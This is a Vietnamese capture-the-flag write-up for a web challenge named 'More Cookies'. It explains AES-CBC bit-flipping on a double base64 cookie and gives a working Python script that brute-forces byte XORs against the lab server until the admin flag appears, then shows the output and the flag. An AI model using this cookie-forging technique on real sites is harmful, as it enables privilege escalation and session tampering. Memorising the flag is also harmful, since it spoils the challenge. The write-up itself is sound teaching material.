# More Cookies

![image.png](More%20Cookies/image.png)

Đây tiếp là 1 bài web liên quan đến cookie

![image.png](More%20Cookies/image%201.png)

Truy cập trang web thì mình thấy không có gì chỉ có mỗi chức năng reset làm mới cookie thôi 

![image.png](More%20Cookies/image%202.png)

Ở đây mình thấy cookie là 1 chuỗi base64 nên mình sẽ thử decode

![image.png](More%20Cookies/image%203.png)

Decode lần đầu thì mình thấy có vẻ vẫn còn 1 lớp base64 nữa nên mình sẽ decode tiếp

![image.png](More%20Cookies/image%204.png)

Lần này sau khi decode thì nó lại ra raw byte không khai thác được gì cả 

Đến đây thì mình chịu nên đã phải mở hint và biết liên quan đến mã hóa đồng hình. Đối với mã hóa đồng hình, bạn có thể can thiệp, tính toán, thao túng ciphertext để tạo ra plaintext mới mà không cần biết plaintext cũ
Tiếp đến mọi người hãy chú ý output rawbyte mà chúng ta thu được là 96byte chia hết 16byte rất giống với aes-cbc block cipher
Đây mình sẽ lấy 1 ví dụ để hiểu hơn về aes-cbc và cách chúng ta sẽ làm bài này 

**1. Cấu trúc dữ liệu gốc (Plaintext)**
Giả sử hệ thống tạo cho bạn một Cookie dài 32 byte. Thuật toán AES cắt nó làm 2 khối (mỗi khối đúng 16 byte):

- **Khối 1 (P1):** `username=vanduc;`
- **Khối 2 (P2):** `admin=0;xyz=1234`

**2. Mục tiêu tấn công**
Bạn cần đổi chữ `0` thành `1` ở Khối 2 để lấy quyền admin. Ký tự `0` này nằm ở **vị trí số 6** của Khối 2.

**3. Lỗ hổng & Cách thực thi**
Trong chế độ CBC, Server giải mã Khối 2 theo công thức sau:**P2 = Decrypt(C2) XOR C1***(Trong đó C1, C2 là vỏ mã hóa của 2 khối)*

Vì Khối mã hóa 1 (C1) được dùng làm chìa khóa XOR để giải mã Khối 2, hacker sẽ không đụng vào Khối 2 mà thao túng thẳng vào Khối 1:

- Hacker lấy byte ở **vị trí số 6** của khối C1.
- Thực hiện lật bit bằng phép XOR: `C1_mới[6] = C1_cũ[6] XOR 1` (do chữ '0' XOR với '1' = 1).
- Gửi lại cookie đã sửa lên server.

**4. Kết quả Server nhận được**

- **Khối 1 giải mã:** Bị hỏng do C1 bị sửa, biến thành ký tự rác (VD: `user%#@^vanduc;`).
- **Khối 2 giải mã:** Phép XOR đẩy sự sai lệch bit xuống đúng vị trí số 6, biến `admin=0` thành `admin=1` một cách hoàn hảo.

Server sẽ đọc được chuỗi `user%#@^vanduc;admin=1;xyz=1234`, lờ đi đoạn rác ở đầu và chính thức cấp quyền Admin cho bạn.

Vì không biết trước chuỗi gốc, mình phải viết script vòng lặp để XOR mù vào từng byte một cho đến khi trúng đích.

```python
import requests
from base64 import b64decode
from base64 import b64encode
def exploit():
    url="http://chatelaine.cylabacademy.net:40422/"
    cookie_ori="U1ZBZDN5dzczanQyMFJuc3k0NnlYdFk4ZTBLc29OWlhucnJsQ0NlNGJKSjhmcDZ4Y0dWREtrM08yYUNxWEt4bDltd3B3em94ZjhGMFdvZ2dBSnhJSktZNG9ocG9Qd2NMT0ZiNVJCamJXN3EzMzR2WnJjMGM0eVM2NVhSZEFRazI="
    raw=bytearray(b64decode(b64decode(cookie_ori)))
    print("bat dau chay")
    for i in range(96):
        print(f"Dang thu vi tri : {i}")
        for j in range(128):
            print(f"Dang thu vi tri : {j}")
            raw1=bytearray(raw)
            raw1[i]^=j
            res=b64encode(b64encode(raw1)).decode()
            cookies1={'auth_name': res}
            try:
                r=requests.get(url,cookies=cookies1)
                if "academy{" in r.text:
                    print(r.text)
                    return
            except requests.exceptions.RequestException:
                continue
exploit()   

```

Chạy sẽ khá là lâu mình phải đợi hơn chục phút gì đó 

```python
ang thu vi tri : 125
Dang thu vi tri : 126
Dang thu vi tri : 127
Dang thu vi tri : 9
Dang thu vi tri : 0
Dang thu vi tri : 1
<!DOCTYPE html>
<html lang="en">

<head>
    <title>More Cookies</title>

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">More Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>academy{cO0ki3s_yum_dfa9a1cd}
</code></p>
        </div>

        <footer class="footer">
            <p>&copy; CyLab Academy</p>
        </footer>

    </div>
</body>

</html>
➜  challenge 
```

Flag: academy{cO0ki3s_yum_dfa9a1cd}